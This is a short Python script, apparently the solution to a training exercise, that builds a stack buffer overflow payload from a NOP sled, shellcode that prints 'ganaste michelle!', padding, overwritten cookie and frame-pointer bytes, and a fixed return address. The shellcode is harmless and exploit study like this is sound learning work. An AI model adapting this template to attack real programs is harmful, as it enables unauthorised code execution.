# payload.py
from struct import pack

# shellcode, imprime you win!

shellcode = "\xeb\x11\x59\xb0\x04\x31\xdb\x43\x31\xd2\xb2\x13\xcd\x80\xb0\x01\x4b\xcd\x80\xe8\xea\xff\xff\xff\x67\x61\x6e\x61\x73\x74\x65\x20\x6d\x69\x63\x68\x65\x6c\x6c\x65\x21\x0b"

ret_addr = 0xbffff594    

output = "\x90" * 20    # nops iniciales buf
output += shellcode     #shellcode
output += "A" * (80 - 20 -len(shellcode)) # padding hasta fin de buf
output += "BBBB"    #lleno cookie
output += "CCCC"    #lleno ebp
output += pack("<I", ret_addr) #defino return address

print(output)